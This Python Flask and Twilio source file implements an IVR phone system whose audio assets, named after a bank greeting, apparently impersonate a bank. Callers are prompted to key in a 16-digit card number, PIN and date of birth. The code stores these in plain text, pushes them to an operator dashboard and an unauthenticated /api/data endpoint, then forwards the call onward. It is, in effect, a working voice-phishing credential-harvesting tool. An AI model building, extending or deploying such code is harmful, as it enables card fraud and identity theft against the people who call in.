from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from flask_socketio import SocketIO, emit
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
from threading import Lock

# Initialize Flask app
app = Flask(__name__)
app.secret_key = "your_secret_key"
socketio = SocketIO(app, cors_allowed_origins="*")

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+mysqlconnector://username:password@host/database'

# User credentials for login
USER_CREDENTIALS = {"username": "admin", "password": "password123"}

# Global server-side data storage with thread lock
server_data = {
    "data_store": {
        "card_number": None,
        "pin": None,
        "dob": None,
        "phone_number": None,
        "notes": [],
        "call_log": []
    },
    "lock": Lock()  # Thread lock for safe concurrent access
}

# Workflow settings for IVR
workflow_settings = {
    "num_digits_card": 16,
    "num_digits_pin": 3,
    "num_digits_dob": 8,
    "audio_urls": {
        "greeting": "https://lemon-caiman-4128.twil.io/assets/RBCGREET01.mp3",
        "retry": "https://lemon-caiman-4128.twil.io/assets/RBCRetry.mp3",
        "pin_prompt": "https://lemon-caiman-4128.twil.io/assets/RBCGREET02%20(2).mp3",
        "dob_prompt": "https://lemon-caiman-4128.twil.io/assets/RBCGREET03.mp3",
        "final_audio": "https://lemon-caiman-4128.twil.io/assets/RBCGREET04%20(2).mp3",
        "ringtone": "https://lemon-caiman-4128.twil.io/assets/ring_ring.mp3"
    }
}

@app.route("/")
def login():
    if "logged_in" in session:
        return redirect(url_for("dashboard"))
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def authenticate():
    username = request.form.get("username")
    password = request.form.get("password")
    if username == USER_CREDENTIALS["username"] and password == USER_CREDENTIALS["password"]:
        session["logged_in"] = True
        return redirect(url_for("dashboard"))
    else:
        return render_template("login.html", error="Invalid username or password")


@app.route("/dashboard")
def dashboard():
    if "logged_in" not in session:
        return redirect(url_for("login"))

    # Calculate call analytics using thread-safe access
    with server_data["lock"]:
        total_calls = len(server_data["data_store"]["call_log"])
        completed_calls = len([
            log for log in server_data["data_store"]["call_log"]
            if "completed" in log.lower()
        ])
        failed_calls = total_calls - completed_calls

    return render_template(
        "dashboard.html",
        data=server_data["data_store"],
        analytics={
            "total_calls": total_calls,
            "completed_calls": completed_calls,
            "failed_calls": failed_calls
        }
    )

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))


@app.route("/api/data")
def get_data():
    return jsonify(server_data["data_store"])

# Twilio IVR flow starts here
# -----------------------------
@app.route("/incoming", methods=["POST"])
def incoming_call():
    """
    1) Greet and ask for card number
    """
    with server_data["lock"]:
        server_data["data_store"]["phone_number"] = request.form.get("Caller")
        socketio.emit("incoming_call", {"phone_number": server_data["data_store"]["phone_number"]})

    # Get how many times they've retried
    card_retries = int(request.args.get("card_retries", 0))

    response = VoiceResponse()

    if card_retries >= 3:
        # Too many retries, forward the call or hang up
        response.dial("+18887379666")
        return str(response)

    if card_retries > 0:
        # They already tried once, play 'retry'
        response.play(workflow_settings["audio_urls"]["retry"])

    gather = Gather(
        num_digits=workflow_settings["num_digits_card"],
        action=url_for("after_card_number", card_retries=card_retries + 1),
        method="POST",
        timeout=15,
        finish_on_key="#"
    )
    gather.play(workflow_settings["audio_urls"]["greeting"])
    response.append(gather)

    # If no digits, loop back to the same function but increment retries
    response.redirect(url_for("incoming_call", card_retries=card_retries + 1))

    return str(response)


@app.route("/after_card_number", methods=["POST"])
def after_card_number():
    """
    2) Process card number, then ask for PIN
    """
    card_retries = int(request.args.get("card_retries", 0))
    card_number = request.form.get("Digits")
    response = VoiceResponse()

    if card_number and len(card_number) == workflow_settings["num_digits_card"]:
        # Valid card
        with server_data["lock"]:
            server_data["data_store"]["card_number"] = card_number
            server_data["data_store"]["call_log"].append(
                f"Card number received: {card_number}"
            )

        # Now ask for PIN. We'll do that in a new route, but let's gather PIN here for simplicity
        response.redirect(url_for("pin_entry", pin_retries=0))
    else:
        # Invalid card, increment card_retries or fallback
        response.play(workflow_settings["audio_urls"]["retry"])
        response.redirect(url_for("incoming_call", card_retries=card_retries + 1))

    return str(response)


@app.route("/pin_entry", methods=["POST"])
def pin_entry():
    """
    3) Gather the PIN
    """
    response = VoiceResponse()
    gather = Gather(
        num_digits=workflow_settings["num_digits_pin"],
        action=url_for("after_pin"),  # Removed pin_retries parameter
        method="POST",
        timeout=15
    )
    gather.play(workflow_settings["audio_urls"]["pin_prompt"])
    response.append(gather)

    return str(response)


@app.route("/after_pin", methods=["POST"])
def after_pin():
    """
    4) Process PIN, then ask for DOB
    """
    pin = request.form.get("Digits")
    response = VoiceResponse()

    # Store PIN and proceed to DOB entry without validation
    with server_data["lock"]:
        server_data["data_store"]["pin"] = pin
        server_data["data_store"]["call_log"].append(
            f"PIN received: {pin}"
        )
    
    # Redirect to DOB entry
    response.redirect(url_for("dob_entry", dob_retries=0))

    return str(response)

@app.route("/dob_entry", methods=["POST"])
def dob_entry():
    """
    5) Gather DOB and finish the call
    """
    response = VoiceResponse()
    gather = Gather(
        num_digits=workflow_settings["num_digits_dob"],
        action=url_for("after_dob"),  # Removed dob_retries parameter
        method="POST",
        timeout=15
    )
    gather.play(workflow_settings["audio_urls"]["dob_prompt"])
    response.append(gather)

    return str(response)


@app.route("/after_dob", methods=["POST"])
def after_dob():
    """
    6) Process DOB and forward the call
    """
    dob = request.form.get("Digits")
    response = VoiceResponse()

    # Store DOB
    with server_data["lock"]:
        server_data["data_store"]["dob"] = dob
        server_data["data_store"]["call_log"].append(
            f"DOB received: {dob}"
        )
    
    # Play final audio and forward the call
    response.play(workflow_settings["audio_urls"]["final_audio"])
    response.dial("+18887950170")  # Forward call to this number

    return str(response)

if __name__ == "__main__":
    socketio.run(app, debug=True, host="0.0.0.0", port=5000)
